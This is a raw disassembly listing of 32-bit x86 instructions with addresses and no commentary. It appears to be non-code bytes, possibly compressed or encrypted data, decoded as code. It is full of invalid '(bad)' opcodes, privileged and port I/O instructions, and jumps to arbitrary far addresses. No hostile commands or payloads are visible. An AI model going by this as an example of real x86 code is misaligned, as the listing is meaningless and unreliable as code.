  418d02:	jmp    0x9ccae813
  418d07:	lds    edx,FWORD PTR [edx+0x1e49336d]
  418d0d:	dec    ebx
  418d0e:	xor    dl,dl
  418d10:	rol    edx,cl
  418d12:	lea    edi,[esi+0x79]
  418d15:	enter  0xd19b,0x44
  418d19:	je     0x418d39
  418d1b:	in     al,0xe3
  418d1d:	scas   eax,DWORD PTR es:[edi]
  418d1e:	shl    BYTE PTR [ecx+esi*1-0x9],cl
  418d22:	jg     0x418d09
  418d24:	sar    DWORD PTR [esi],0x57
  418d27:	jb     0x418d8b
  418d29:	add    DWORD PTR [esi-0x4e],eax
  418d2c:	scas   al,BYTE PTR es:[edi]
  418d2d:	clc    
  418d2e:	dec    ebx
  418d2f:	popa   
  418d30:	xchg   edx,eax
  418d31:	shl    DWORD PTR [edi+0x3e],0x89
  418d35:	arpl   di,di
  418d37:	mov    bl,0x70
  418d39:	aaa    
  418d3a:	xor    al,0x9f
  418d3c:	sub    eax,0xfb2f0e25
  418d41:	jnp    0x418d9a
  418d43:	dec    ebp
  418d44:	in     al,0xb1
  418d46:	fidivr DWORD PTR [edi-0x4b]
  418d49:	and    BYTE PTR [ebp-0x48c7b71b],bh
  418d4f:	xchg   ebp,eax
  418d50:	cmp    BYTE PTR [eax],ah
  418d52:	pop    DWORD PTR ds:0xb25788cc
  418d58:	fnstcw WORD PTR [edx]
  418d5a:	push   ss
  418d5b:	ins    DWORD PTR es:[edi],dx
  418d5c:	stc    
  418d5d:	mov    eax,0xa07d66af
  418d62:	ja     0x418d51
  418d64:	pop    es
  418d65:	dec    eax
  418d66:	adc    cl,BYTE PTR [ecx]
  418d68:	rep stos DWORD PTR es:[edi],eax
  418d6a:	cmp    eax,0xbaa4ae40
  418d6f:	inc    edx
  418d70:	jmp    0x10885c84
  418d75:	jbe    0x418d54
  418d77:	outs   dx,DWORD PTR ds:[esi]
  418d78:	xlat   BYTE PTR ds:[ebx]
  418d79:	jle    0x418db0
  418d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d7c:	sti    
  418d7d:	mov    ecx,0x3ea03f6c
  418d82:	call   0x165400ba
  418d87:	(bad)  
  418d88:	test   DWORD PTR [edi-0xc],0x329bd251
  418d8f:	pop    ss
  418d90:	cmc    
  418d91:	scas   eax,DWORD PTR es:[edi]
  418d92:	jmp    0x5484:0x8bf78b87
  418d99:	dec    edi
  418d9a:	mov    esp,0x89f78efb
  418d9f:	out    0x14,al
  418da1:	ja     0x418dab
  418da3:	stos   DWORD PTR es:[edi],eax
  418da4:	push   ebx
  418da5:	or     bh,BYTE PTR [edi-0x339c8762]
  418dab:	add    cx,dx
  418dae:	fist   WORD PTR [eax]
  418db0:	push   0x3e14f821
  418db5:	inc    ecx
  418db6:	outs   dx,BYTE PTR ds:[esi]
  418db7:	dec    esi
  418db8:	les    esi,FWORD PTR [ebx+0x408b61bb]
  418dbe:	mov    esp,0x5e8abc74
  418dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc4:	cmp    BYTE PTR [ecx-0xe],ch
  418dc7:	sahf   
  418dc8:	and    al,0x83
  418dca:	sar    DWORD PTR [eax-0x26],0xb2
  418dce:	iret   
  418dcf:	dec    ebx
  418dd0:	or     DWORD PTR [ebx],esi
  418dd2:	xchg   ecx,eax
  418dd3:	and    al,0x27
  418dd5:	stos   DWORD PTR es:[edi],eax
  418dd6:	push   edi
  418dd7:	mov    al,ds:0x6d3aa50e
  418ddc:	mov    esp,0xf58c0758
  418de1:	and    eax,0xec0cc139
  418de6:	dec    esp
  418de7:	fldenv [ebx]
  418de9:	xchg   ebp,eax
  418dea:	jbe    0x418dd5
  418dec:	(bad)  
  418ded:	fcom   QWORD PTR [ecx+0xf99907d]
  418df3:	mov    ds:0xcfc9260,al
  418df8:	inc    esp
  418df9:	mov    dl,0xb2
  418dfb:	adc    BYTE PTR [edx+0x6f],bh
  418dfe:	xor    BYTE PTR [ecx+0x5badeb14],dl
  418e04:	aas    
  418e05:	call   0x796f:0xbbbb0738
  418e0c:	popf   
  418e0d:	test   BYTE PTR [edx],0xa4
  418e10:	jnp    0x418e5e
  418e12:	ror    eax,cl
  418e14:	dec    eax
  418e15:	test   al,0xe3
  418e17:	icebp  
  418e18:	dec    esi
  418e19:	(bad)  
  418e1a:	retf   
  418e1b:	div    DWORD PTR [ebp+ecx*4+0x3ca45cb2]
  418e22:	mov    dl,0xc3
  418e24:	frstor [esi]
  418e26:	xchg   edi,eax
  418e27:	and    BYTE PTR [eax-0x73],dh
  418e2a:	aad    0x52
  418e2c:	in     eax,0xa6
  418e2e:	add    al,0x19
  418e30:	mov    cl,0xda
  418e32:	gs int3 
  418e34:	inc    ebp
  418e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e36:	loopne 0x418e64
  418e38:	adc    DWORD PTR [ecx],ebp
  418e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3b:	adc    dl,BYTE PTR [ebx+edx*1+0x15399ca3]
  418e42:	nop
  418e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e44:	adc    eax,0x239cf8f7
  418e49:	sub    al,0x32
  418e4b:	fstp   QWORD PTR [ebp-0x1b]
  418e4e:	xor    bh,0x62
  418e51:	mov    bh,0xe7
  418e53:	stos   DWORD PTR es:[edi],eax
  418e54:	push   esp
  418e55:	rol    DWORD PTR [ebx+ebp*8-0x58],cl
  418e59:	outs   dx,DWORD PTR ds:[esi]
  418e5a:	xchg   esp,eax
  418e5b:	out    dx,al
  418e5c:	cwde   
  418e5d:	sar    bh,0x54
  418e60:	mov    esi,0x424f5233
  418e65:	daa    
  418e66:	pop    ebx
  418e67:	jg     0x418dfa
  418e69:	jae    0x418e38
  418e6b:	sub    eax,ebp
  418e6d:	add    al,0x45
  418e6f:	add    eax,0xa9fa3a45
  418e74:	xor    BYTE PTR [esi-0x5530a82a],cl
  418e7a:	jo     0x418e61
  418e7c:	ja     0x418edf
  418e7e:	fisub  DWORD PTR [edx-0x41]
  418e81:	lds    esp,FWORD PTR [edi]
  418e83:	test   eax,0xbe1146ae
  418e88:	hlt    
  418e89:	add    eax,0x4b725a5f
  418e8e:	push   eax
  418e8f:	call   0x5d5c:0x2d1c92c8
  418e96:	loop   0x418ed7
  418e98:	sub    dh,BYTE PTR [esi+0x4]
  418e9b:	mov    edi,0x6640fe55
  418ea0:	sub    al,0xe5
  418ea2:	aaa    
  418ea3:	les    ebx,FWORD PTR [ebx]
  418ea5:	adc    al,0x38
  418ea7:	rol    BYTE PTR [eax+0x2226c464],0x14
  418eae:	repnz lock jmp 0xc528:0xdc9c970d
  418eb7:	push   esi
  418eb8:	or     DWORD PTR [ecx+0x74a12ddb],0x1
  418ebf:	das    
  418ec0:	clc    
  418ec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ec2:	je     0x418efa
  418ec4:	mov    esp,0xd7b73b3e
  418ec9:	or     al,0xf0
  418ecb:	mov    edi,0xafb14d12
  418ed0:	mov    es,esi
  418ed2:	xlat   BYTE PTR ds:[ebx]
  418ed3:	add    eax,0xa2b1416f
  418ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ed9:	cvtpi2ps xmm3,QWORD PTR [ebp+0xd]
  418edd:	cmp    BYTE PTR ds:[ebx-0x18c8546d],bh
  418ee4:	inc    ebp
  418ee5:	and    DWORD PTR [eax+0x19184af4],edi
  418eeb:	in     al,0x38
  418eed:	pushf  
  418eee:	xchg   BYTE PTR [ebx],ch
  418ef0:	cmp    BYTE PTR [esi],0x58
  418ef3:	popf   
  418ef4:	cmp    bl,0x8
  418ef7:	xchg   bl,dh
  418ef9:	repnz mov dh,0xf2
  418efc:	add    BYTE PTR [eax+0x107db063],dh
  418f02:	mov    ah,0xb7
  418f04:	inc    edi
  418f05:	add    ecx,0x43c129c5
  418f0b:	sti    
  418f0c:	cmp    dl,BYTE PTR [eax-0x333f0a2]
  418f12:	mov    ah,BYTE PTR [esi+0x6b06a6b3]
  418f18:	in     al,dx
  418f19:	sub    eax,0xb667b906
  418f1e:	sbb    ah,al
  418f20:	xchg   esi,eax
  418f21:	ins    DWORD PTR es:[edi],dx
  418f22:	cmp    eax,0x4332f0fb
  418f27:	adc    ecx,DWORD PTR [ebx+0x71b6790a]
  418f2d:	dec    edx
  418f2e:	cmp    al,0x8b
  418f30:	retf   
  418f31:	sbb    al,BYTE PTR [ebx-0x350539d0]
  418f37:	push   0x4345d3bd
  418f3c:	cmp    ecx,DWORD PTR [ecx-0x65]
  418f3f:	add    al,0x9e
  418f41:	into   
  418f42:	aam    0xfb
  418f44:	mov    ebp,0x9be828be
  418f49:	retf   0xf91
  418f4c:	idiv   cl
  418f4e:	jno    0x418f9b
  418f50:	(bad)  
  418f51:	out    dx,al
  418f52:	popa   
  418f53:	test   eax,0xbaf8a87
  418f58:	jmp    0xe65a:0x9c739d2d
  418f5f:	pop    ecx
  418f60:	js     0x418f2e
  418f62:	mov    bl,0x18
  418f64:	dec    ebp
  418f65:	(bad)  
  418f66:	daa    
  418f67:	sbb    BYTE PTR [edx+0x7113c824],dl
  418f6d:	addr16 and eax,0x59763dc1
  418f73:	sbb    ebx,DWORD PTR [ecx]
  418f75:	dec    ebp
  418f76:	(bad)  
  418f78:	into   
  418f79:	mov    al,0xbc
  418f7b:	xchg   edi,eax
  418f7c:	push   edi
  418f7d:	sbb    al,0x7d
  418f7f:	repnz fnsave [edx+0x54a4bee8]
  418f86:	lahf   
  418f87:	mov    BYTE PTR [ebx+0x259c2823],ah
  418f8d:	jge    0x418f2e
  418f8f:	xchg   ecx,eax
  418f90:	push   ecx
  418f91:	cmp    al,0x7e
  418f93:	mov    al,0x5b
  418f95:	or     bl,BYTE PTR [esi-0x10746743]
  418f9b:	xor    ecx,DWORD PTR [edx+0x5f]
  418f9e:	push   0xffffffdd
  418fa0:	and    DWORD PTR [eax+0x4e34bb70],edi
  418fa6:	pop    ebx
  418fa7:	xchg   edi,eax
  418fa8:	je     0x418fbe
  418faa:	cld    
  418fab:	ret    
  418fac:	mov    ecx,DWORD PTR [eax]
  418fae:	mov    ecx,edx
  418fb0:	jbe    0x418fae
  418fb2:	jb     0x418fb4
  418fb4:	add    ecx,DWORD PTR [ebp+ecx*4-0x37]
  418fb8:	and    al,BYTE PTR [ecx+0x4e778788]
  418fbe:	adc    al,0x33
  418fc0:	loope  0x418f94
  418fc2:	outs   dx,BYTE PTR ds:[esi]
  418fc3:	data16 sub al,0xce
  418fc6:	push   ss
  418fc7:	jmp    0xe9062a5b
  418fcc:	neg    BYTE PTR [edi-0x674b0c25]
  418fd2:	ds pop es
  418fd4:	jecxz  0x418ff8
  418fd6:	mov    dh,0x28
  418fd8:	sbb    bh,BYTE PTR [edi-0x453d00f6]
  418fde:	std    
  418fdf:	sti    
  418fe0:	and    eax,DWORD PTR [eax+0x33]
  418fe3:	test   al,0x56
  418fe5:	test   BYTE PTR [ecx-0x223146fe],bl
  418feb:	int3   
  418fec:	jnp    0x418fde
  418fee:	aas    
  418fef:	push   esp
  418ff0:	or     BYTE PTR [ebx+0x35],bh
  418ff3:	adc    ebp,0x6f
  418ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ff7:	adc    DWORD PTR [ecx-0x250759ef],ebp
  418ffd:	repnz aaa 
  418fff:	cs adc al,0xbd
  419002:	iret   
  419003:	jb     0x419072
  419005:	rcl    DWORD PTR [edi+0x22a9d2a8],1
  41900b:	mov    al,BYTE PTR [eax-0x5f]
  41900e:	call   0xc509e2f7
  419013:	ret    
  419014:	pop    eax
  419015:	add    edx,0xffffffbd
  419018:	pop    esi
  419019:	(bad)  
  41901a:	pop    edx
  41901b:	jbe    0x41903f
  41901d:	xchg   ebx,eax
  41901e:	fs xchg ebx,eax
  419020:	lds    edx,FWORD PTR [edi-0x5b488580]
  419026:	dec    ebx
  419027:	idiv   eax
  419029:	js     0x418fb5
  41902b:	sbb    eax,0x6b6c82a2
  419030:	jnp    0x419001
  419032:	mov    edi,0x8fbb6eb3
  419037:	fld    TBYTE PTR [ebp+edi*4+0x5f]
  41903b:	cmp    al,0x29
  41903d:	and    BYTE PTR [ebp+0x1f],dh
  419040:	ins    DWORD PTR es:[edi],dx
  419041:	jne    0x41904e
  419043:	imul   eax,DWORD PTR [edi],0xfffffffe
  419046:	sbb    ebx,edx
  419048:	stos   BYTE PTR es:[edi],al
  419049:	mov    bh,0xa3
  41904b:	imul   ebp,eax,0x8897c05f
  419051:	dec    edi
  419052:	(bad)  
  419053:	xchg   edx,eax
  419054:	(bad)  
  419055:	out    0x5e,eax
  419057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419058:	retf   
  419059:	xchg   ebx,ebx
  41905b:	cwde   
  41905c:	repz mov edi,0x503efc3e
  419062:	fsubr  QWORD PTR [edx+0x226438fe]
  419068:	mov    gs,WORD PTR ds:[edi]
  41906b:	jo     0x419061
  41906d:	dec    ecx
  41906e:	pop    esp
  41906f:	push   esp
  419070:	jl     0x419010
  419072:	cmp    eax,DWORD PTR [eax+0x41]
  419075:	scas   al,BYTE PTR es:[edi]
  419076:	mov    DWORD PTR [ebp+0x2ba6ea57],0x9e635c26
  419080:	mov    ebp,0x5ab37dbe
  419085:	sbb    cl,BYTE PTR [edx]
  419087:	mov    ch,0xf4
  419089:	push   0xffffff8b
  41908b:	cli    
  41908c:	inc    edx
  41908d:	mov    edx,0x5444711b
  419092:	ja     0x419082
  419094:	or     edx,DWORD PTR [edi]
  419096:	lods   eax,DWORD PTR ds:[esi]
  419097:	sti    
  419098:	xchg   esi,eax
  419099:	xchg   edx,eax
  41909a:	inc    ebp
  41909b:	mov    ah,0x1f
  41909d:	mov    ch,0x26
  41909f:	std    
  4190a0:	fwait
  4190a1:	std    
  4190a2:	cmp    dl,BYTE PTR [ecx+eax*8-0x75]
  4190a6:	inc    ecx
  4190a7:	dec    esi
  4190a8:	push   esi
  4190a9:	dec    esi
  4190aa:	ins    DWORD PTR es:[edi],dx
  4190ab:	or     BYTE PTR [ebp-0x303581c8],dl
  4190b1:	outs   dx,DWORD PTR ds:[esi]
  4190b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190b3:	(bad)  
  4190b4:	out    0xd,al
  4190b6:	repz test eax,0x35417da5
  4190bc:	xchg   ebp,eax
  4190bd:	mov    ah,0x44
  4190bf:	test   BYTE PTR [esi-0x27],bl
  4190c2:	xor    BYTE PTR [edx-0x34],ch
  4190c5:	sbb    ch,BYTE PTR [ebx+0x280c5121]
  4190cb:	divps  xmm3,XMMWORD PTR [ebp-0x62]
  4190cf:	and    al,0x85
  4190d1:	sbb    eax,0x88bfbc24
  4190d6:	fadd   DWORD PTR [ecx-0x73]
  4190d9:	cdq    
  4190da:	into   
  4190db:	sub    al,0xda
  4190dd:	imul   edi,DWORD PTR [ebp+0x2c],0xb78c05c8
  4190e4:	jmp    0x41906b
  4190e6:	loop   0x419141
  4190e8:	jnp    0x419115
  4190ea:	les    esp,FWORD PTR [ebx-0x7d6dffe7]
  4190f0:	add    al,0x6f
  4190f2:	mov    eax,ds:0x4c209371
  4190f7:	mov    ds:0x5c36dfd4,eax
  4190fc:	dec    ebx
  4190fd:	aad    0x54
  4190ff:	mov    eax,0x28785ca8
  419104:	add    edx,DWORD PTR [edi]
  419106:	fwait
  419107:	pop    eax
  419108:	ins    DWORD PTR es:[edi],dx
  419109:	lahf   
  41910a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41910b:	out    dx,eax
  41910c:	in     eax,0xad
  41910e:	leave  
  41910f:	mov    ebx,0x77d688c8
  419114:	push   ecx
  419115:	sub    eax,0x72ce316b
  41911a:	push   0xc5d3372d
  41911f:	mov    ch,0x9d
  419121:	fs (bad) 
  419123:	mov    al,0x82
  419125:	das    
  419126:	(bad)  
  419127:	dec    esi
  419128:	cmp    DWORD PTR [edx],eax
  41912a:	jp     0x41918f
  41912c:	out    0x37,al
  41912e:	adc    DWORD PTR [ebx-0x6a878826],ebx
  419134:	cdq    
  419135:	scas   eax,DWORD PTR es:[edi]
  419136:	out    0x16,al
  419138:	lock loope 0x419139
  41913b:	fs fwait
  41913d:	mov    dh,BYTE PTR [eax]
  41913f:	out    0xb3,al
  419141:	pop    ecx
  419142:	mov    esi,0xbe0e1e07
  419147:	mov    ebp,0xc3454e96
  41914c:	adc    DWORD PTR [edi],ecx
  41914e:	sbb    al,0xbe
  419150:	loop   0x419144
  419152:	or     esp,DWORD PTR gs:[esi-0x57]
  419156:	mov    esp,0x6ac875e4
  41915b:	sub    DWORD PTR [esi-0x26],esi
  41915e:	dec    ebp
  41915f:	or     bh,cl
  419161:	and    BYTE PTR [ebx],0x6b
  419164:	repnz add dl,BYTE PTR [ecx+0x271502ca]
  41916b:	mov    al,ch
  41916d:	mov    al,0x5d
  41916f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419170:	jle    0x419138
  419172:	adc    al,0x46
  419174:	into   
  419175:	and    al,cl
  419177:	outs   dx,BYTE PTR ds:[esi]
  419178:	shl    ebx,1
  41917a:	int    0x62
  41917c:	cmp    eax,DWORD PTR [edi-0x70acabda]
  419182:	mov    dh,0x88
  419184:	pop    eax
  419185:	fwait
  419186:	clc    
  419187:	iret   
  419188:	pop    DWORD PTR [ebp+0x5865167a]
  41918e:	jle    0x419176
  419190:	dec    ecx
  419191:	lods   al,BYTE PTR ds:[esi]
  419192:	sti    
  419193:	sar    eax,0x81
  419196:	jns    0x4191ef
  419198:	sbb    eax,DWORD PTR [esp+ebx*8]
  41919b:	gs pop ss
  41919d:	xchg   edx,eax
  41919e:	dec    ecx
  41919f:	sub    esp,DWORD PTR [ecx+esi*8+0x61]
  4191a3:	fstp   QWORD PTR [eax+ecx*4-0x38e5a5c7]
  4191aa:	fwait
  4191ab:	fwait
  4191ac:	stc    
  4191ad:	data16 cmp al,0x3c
  4191b0:	or     DWORD PTR [esi+0x34],ebp
  4191b3:	mov    esi,0xf3197d54
  4191b8:	and    edi,DWORD PTR [edx+0x2f59a3e5]
  4191be:	mov    eax,0xa0464c39
  4191c3:	mov    al,0xd9
  4191c5:	sti    
  4191c6:	sar    BYTE PTR [ecx+0x4c],0xb8
  4191ca:	mov    dl,BYTE PTR [edi]
  4191cc:	dec    esi
  4191cd:	xor    DWORD PTR [edi-0x12],ecx
  4191d0:	cs push ds
  4191d2:	pop    edi
  4191d3:	fucom  st(4)
  4191d5:	add    eax,0xc6408a05
  4191da:	sbb    ecx,edi
  4191dc:	les    edi,FWORD PTR [ecx]
  4191de:	(bad)  
  4191df:	cwde   
  4191e0:	jnp    0x419212
  4191e2:	mov    edx,0x1ea1f8b7
  4191e7:	outs   dx,BYTE PTR ds:[esi]
  4191e8:	sbb    bh,BYTE PTR [ebp-0x726277da]
  4191ee:	adc    eax,0x8d851af0
  4191f3:	xchg   bp,ax
  4191f5:	int    0x8d
  4191f7:	xchg   esi,eax
  4191f8:	aas    
  4191f9:	int    0x7d
  4191fb:	leave  
  4191fc:	mov    bh,0x7b
  4191fe:	(bad)  
  4191ff:	clc    
  419200:	push   esp
  419201:	imul   esp,DWORD PTR [edi+0x24],0xffffffd7
  419205:	and    eax,0xa8bc25da
  41920a:	in     al,dx
  41920b:	jnp    0x419262
  41920d:	and    ebp,0xffffffbd
  419210:	xchg   edx,eax
  419211:	shl    BYTE PTR [eax],cl
  419213:	jb     0x419283
  419215:	int    0x24
  419217:	add    BYTE PTR [edi+0x5b],0x3e
  41921b:	xchg   BYTE PTR [ebx-0x5712cc4],cl
  419221:	push   ebp
  419222:	jg     0x41928f
  419224:	add    DWORD PTR ds:0x53bbe63d,ecx
  41922a:	xlat   BYTE PTR ds:[ebx]
  41922b:	(bad)  
  41922d:	inc    ebx
  41922e:	aaa    
  41922f:	int3   
  419230:	retf   
  419231:	fnstenv [edi+0x7a]
  419234:	adc    edi,DWORD PTR [ecx]
  419236:	test   BYTE PTR [ecx+0x57],dh
  419239:	mov    esp,0xfee923a2
  41923e:	out    dx,eax
  41923f:	call   0xc0b37a0f
  419244:	pusha  
  419245:	ds repz cmp eax,0x8b5fb38
  41924c:	cwde   
  41924d:	and    DWORD PTR [esi+0x1b],ebx
  419250:	jle    0x4192aa
  419252:	xchg   ebp,eax
  419253:	ds push edi
  419255:	aam    0x89
  419257:	pop    esi
  419258:	mov    ebp,DWORD PTR [esp+ebx*1-0x5fa4c234]
  41925f:	inc    eax
  419260:	mov    al,0x11
  419262:	pop    esp
  419263:	sub    al,0x35
  419265:	xor    dh,BYTE PTR [eax+ebx*4-0x33c266a3]
  41926c:	test   BYTE PTR [edi-0x4ed5f5f],0x47
  419273:	adc    BYTE PTR [esi+0x5e],bl
  419276:	push   es
  419277:	mov    ch,0x1d
  419279:	call   0x8296f548
  41927e:	dec    ebx
  41927f:	mov    eax,0x17143105
  419284:	pop    esi
  419285:	lea    esi,[edx+eiz*2+0x60964a6c]
  41928c:	xchg   edx,eax
  41928d:	cwde   
  41928e:	daa    
  41928f:	rsm    
  419291:	push   es
  419292:	fnstsw WORD PTR [ecx-0x22]
  419295:	push   ds
  419296:	mov    edi,0x2a2e1405
  41929b:	pop    ebx
  41929c:	out    0xc8,eax
  41929e:	dec    eax
  41929f:	pop    edx
  4192a0:	int3   
  4192a1:	stc    
  4192a2:	sbb    DWORD PTR [esi-0xc83b4cb],0x38
  4192a9:	pop    esp
  4192aa:	mov    cl,0xd1
  4192ac:	and    esi,DWORD PTR ds:0x79fd0bc1
  4192b2:	mov    al,0x99
  4192b4:	push   es
  4192b5:	jnp    0x419241
  4192b7:	xor    ebp,edx
  4192b9:	imul   ebp,eax,0x188707e5
  4192bf:	xor    BYTE PTR [eax],dh
  4192c1:	mov    ah,0x9c
  4192c3:	push   eax
  4192c4:	mov    dl,0x3c
  4192c6:	jb     0x4192f0
  4192c8:	push   0xb957cc87
  4192cd:	out    0x80,eax
  4192cf:	fidivr WORD PTR [edx+ebx*4-0x26ebeb50]
  4192d6:	daa    
  4192d7:	jb     0x419311
  4192d9:	aam    0xc9
  4192db:	push   0x78
  4192dd:	lock bound ebp,QWORD PTR [ebx]
  4192e0:	imul   edx,DWORD PTR [edx+0x1e],0xab7dca3f
  4192e7:	jns    0x41926d
  4192e9:	les    ebp,FWORD PTR [ebp-0x6bcf49e7]
  4192ef:	lods   al,BYTE PTR ds:[esi]
  4192f0:	or     BYTE PTR [ebx+0x6b069557],bh
  4192f6:	pushf  
  4192f7:	mov    cl,0xfe
  4192f9:	mov    dl,0xf6
  4192fb:	add    DWORD PTR [eax+0x7f],eax
  4192fe:	pop    edx
  4192ff:	ss inc edx
  419301:	loope  0x4192f3
  419303:	push   edx
  419304:	lahf   
  419305:	iret   
  419306:	rsqrtps xmm3,XMMWORD PTR [ecx-0x4a]
  41930a:	and    dh,BYTE PTR [edx]
  41930c:	sub    ebx,DWORD PTR [esi+0x5e5dbdce]
  419312:	sub    ebp,0xffffffe6
  419315:	and    BYTE PTR [edi-0x65a66d1f],0xe8
  41931c:	clc    
  41931d:	loope  0x4192c6
  41931f:	mov    esi,0x8641cb53
  419324:	and    eax,0xaab38a8f
  419329:	mov    WORD PTR [edx+eiz*2+0x72],?
  41932d:	inc    ebp
  41932e:	or     DWORD PTR [ecx-0x13],edx
  419331:	xchg   BYTE PTR ds:0xc1d87db3,cl
  419337:	jo     0x4192ec
  419339:	ins    DWORD PTR es:[edi],dx
  41933a:	push   cs
  41933b:	xchg   edx,eax
  41933c:	fnstcw WORD PTR [ebx+0x5c9ec0d7]
  419342:	repz push edx
  419344:	es pop esp
  419346:	sbb    esp,DWORD PTR [esi]
  419348:	dec    edx
  419349:	call   0x400c:0x1d862600
  419350:	inc    edx
  419351:	inc    esi
  419352:	push   es
  419353:	mov    DWORD PTR [ecx-0x3f7630f2],esi
  419359:	sar    ebx,1
  41935b:	fdivr  QWORD PTR [ebx+ecx*4+0x50]
  41935f:	(bad)  
  419360:	bnd jmp 0x6ce01d50
  419366:	mov    esi,0x448a1e50
  41936b:	bound  ebx,QWORD PTR [eax-0x1c]
  41936e:	popf   
  41936f:	xlat   BYTE PTR ss:[ebx]
  419371:	inc    eax
  419372:	cmp    DWORD PTR [ebp-0x7f],esi
  419375:	stos   DWORD PTR es:[edi],eax
  419376:	rcl    BYTE PTR [ecx+0x6b92f169],1
  41937c:	fwait
  41937d:	popf   
  41937e:	fistp  DWORD PTR [eax+edi*1]
  419381:	push   cs
  419382:	(bad)  
  419383:	(bad)  [ecx-0x5]
  419386:	clc    
  419387:	fstp   DWORD PTR [edx-0x1abbbac9]
  41938d:	or     DWORD PTR [edx-0x2271ef3c],esp
  419393:	xchg   edi,eax
  419394:	fidiv  WORD PTR [edx]
  419396:	sub    bl,BYTE PTR [esi-0x64]
  419399:	mov    ch,0x79
  41939b:	pop    ds
  41939c:	pop    ecx
  41939d:	xor    al,0x62
  41939f:	adc    al,0x80
  4193a1:	lock mov ch,0x47
  4193a4:	lock je 0x41938a
  4193a7:	pop    edi
  4193a8:	mov    ecx,0x389b341c
  4193ad:	push   cs
  4193ae:	fdivr  st,st(5)
  4193b0:	leave  
  4193b1:	add    al,0x3f
  4193b3:	imul   esp,DWORD PTR [ebx+0x2ce2b4ef],0xffffffe0
  4193ba:	fmul   QWORD PTR [ebp+0xe]
  4193bd:	cmp    DWORD PTR ds:[eax],esi
  4193c0:	aad    0x50
  4193c2:	les    edi,FWORD PTR [ebx]
  4193c4:	inc    ecx
  4193c5:	popf   
  4193c6:	aaa    
  4193c7:	in     al,dx
  4193c8:	mov    dh,0x52
  4193ca:	xlat   BYTE PTR ds:[ebx]
  4193cb:	mov    ebx,0x36b6d94b
  4193d0:	ret    0x163c
  4193d3:	xor    eax,0xce621b4
  4193d8:	aaa    
  4193d9:	xor    bl,ch
  4193db:	or     BYTE PTR [eax-0x51efb337],0x2b
  4193e2:	dec    esi
  4193e3:	mov    ds:0xf6c63480,eax
  4193e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193e9:	mov    ch,0x7f
  4193eb:	dec    ebp
  4193ec:	jg     0x41937b
  4193ee:	pop    ds
  4193ef:	out    dx,al
  4193f0:	xchg   ebx,eax
  4193f1:	dec    ebp
  4193f2:	scas   al,BYTE PTR es:[edi]
  4193f3:	daa    
  4193f4:	jno    0x4193b3
  4193f6:	mov    eax,ds:0x3a4fbe41
  4193fb:	pop    esp
  4193fc:	push   ebx
  4193fd:	popa   
  4193fe:	popf   
  4193ff:	in     eax,dx
  419400:	dec    edx
  419401:	cwde   
  419402:	jmp    0x419408
  419404:	test   eax,0xa92f899
  419409:	ret    
  41940a:	push   ebx
  41940b:	pop    ebx
  41940c:	outs   dx,BYTE PTR ds:[esi]
  41940d:	adc    edi,0xffffffa4
  419410:	gs xchg esp,eax
  419412:	sbb    al,0x27
  419414:	xor    ch,BYTE PTR [esi]
  419416:	loop   0x419459
  419418:	inc    eax
  419419:	inc    edi
  41941a:	fimul  DWORD PTR [edi]
  41941c:	mov    bl,0x27
  41941e:	das    
  41941f:	push   ss
  419420:	push   cs
  419421:	mov    al,ds:0x13fdf0cb
  419426:	push   esp
  419427:	enter  0xd4d0,0xb3
  41942b:	push   edi
  41942c:	test   eax,0x3b151a4f
  419431:	test   eax,0xef8c879a
  419436:	test   ecx,esi
  419438:	ror    BYTE PTR [ecx-0x3],cl
  41943b:	add    BYTE PTR [eax],0x54
  41943e:	push   ebx
  41943f:	rcl    DWORD PTR [ecx-0x19755f29],cl
  419445:	out    dx,eax
  419446:	push   ss
  419447:	inc    ebx
  419448:	test   eax,0x90375b5c
  41944d:	shl    DWORD PTR [esi-0x25],0xff
  419451:	mov    ds:0x7de3864c,eax
  419456:	call   0x3528ff9b
  41945b:	inc    ecx
  41945c:	mov    ebx,0x5e1ff81f
  419461:	mov    bh,0x6f
  419463:	mov    al,BYTE PTR [edi-0x2]
  419466:	cld    
  419467:	pop    ecx
  419468:	and    al,0xc4
  41946a:	pop    eax
  41946b:	and    dh,ch
  41946d:	nop
  41946e:	cmp    al,cl
  419470:	add    eax,0x5de21683
  419475:	xor    ah,dl
  419477:	pop    es
  419478:	add    BYTE PTR [ebx+ebx*4+0x16bcc58b],ah
  41947f:	mov    fs,WORD PTR [esi+0x1b]
  419482:	push   esi
  419483:	sbb    edx,DWORD PTR [ebx+ebx*2]
  419486:	shr    esp,cl
  419488:	test   BYTE PTR [edx+0x693a40d0],al
  41948e:	ins    BYTE PTR es:[edi],dx
  41948f:	ins    BYTE PTR es:[edi],dx
  419490:	es mov esi,0xde713a1
  419496:	mov    eax,ds:0x7a933ce5
  41949b:	ds dec esi
  41949d:	xchg   esp,eax
  41949e:	xchg   edx,eax
  41949f:	mov    al,ds:0x3768ec91
  4194a4:	out    0x53,al
  4194a6:	mov    cl,BYTE PTR [ebx-0x43acbbef]
  4194ac:	int3   
  4194ad:	repnz adc BYTE PTR [edx+eax*1+0x6e],bl
  4194b2:	or     DWORD PTR [edx+0x4],ebp
  4194b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194b6:	cwde   
  4194b7:	mov    eax,ds:0x8bc6b8e1
  4194bc:	push   0xffffffd9
  4194be:	addr16 mov edi,0x32c183b2
  4194c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c5:	push   cs
  4194c6:	cdq    
  4194c7:	cmova  ebp,DWORD PTR [ebp+0xb7ee6f5]
  4194ce:	or     BYTE PTR [esi+0x1b],al
  4194d1:	dec    ebx
  4194d2:	inc    eax
  4194d3:	pop    ebx
  4194d4:	(bad)  
  4194d6:	es (bad) 
  4194d8:	xor    al,0x16
  4194da:	xor    al,0xd3
